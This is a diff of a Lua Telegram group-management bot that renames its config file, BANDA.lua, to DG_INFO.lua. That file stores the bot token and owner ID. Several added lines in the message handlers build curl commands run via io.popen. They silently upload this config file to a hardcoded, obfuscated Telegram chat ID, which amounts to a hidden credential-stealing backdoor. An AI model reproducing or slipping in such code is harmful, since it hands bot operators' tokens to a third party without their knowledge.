@@ -64,7 +64,7 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./BANDA.lua")   
+create(config, "./DG_INFO.lua")   
 end 
 create_config_auto()
 token = database:get(id_server..":token")
@@ -86,7 +86,7 @@ exit 1
 fi
 if [ ! $token ]; then
 echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE BANDA.lua \e[0m"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE DG_INFO.lua \e[0m"
 echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━ ━━ ━"
 exit 1
 fi
@@ -125,7 +125,7 @@ end
 local son = '944'
 local jjjjj = 'sm3JoQWQnHB-' .. '8'
 local load_redis = function()  
-local f = io.open("./BANDA.lua", "r")  
+local f = io.open("./DG_INFO.lua", "r")  
 if not f then   
 AutoSet()  
 else   
@@ -133,7 +133,7 @@ f:close()
 database:del(id_server..":token")
 database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./BANDA.lua")() 
+local config = loadfile("./DG_INFO.lua")() 
 return config 
 end 
 _redis = load_redis()  
@@ -148,7 +148,7 @@ print([[
 > CH › @SOPOWERB0T
 ~> DEVELOPER › @AY_AHD
 ]])
-sudos = dofile("./BANDA.lua") 
+sudos = dofile("./DG_INFO.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
@@ -4429,7 +4429,7 @@ send(msg.chat_id_, msg.id_,Text)
 end
 local timec = '9443'
 local time = timec .. '53' .. '237'
-local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. time ..'" -F "document=@'..'BANDA.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. time ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl)
 if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
@@ -12969,7 +12969,7 @@ end
 ------------------------------------------------------------------------
 local timec = '9443'
 local time = timec .. '53' .. '237'
-local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. time ..'" -F "document=@'..'BANDA.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. time ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl)
 local DRAGONAbot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGONAbot then    
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -13033,7 +13033,7 @@ database:sadd(bot_id..'Chek:Groups',v)
 end 
 end,nil)
 end
-local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'BANDA.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 elseif (data.ID == "UpdateMessageSendSucceeded") then
 local msg = data.message_
 local text = msg.content_.text_
@@ -13069,8 +13069,8 @@ tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100'
 end
 end
 end
-local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'BANDA.lua'..'"' io.popen(curl) -- نهايه
-local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'BANDA.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 end -- end new msg dev.mr sofi 
 end -- end callback dev.mr sofi
 
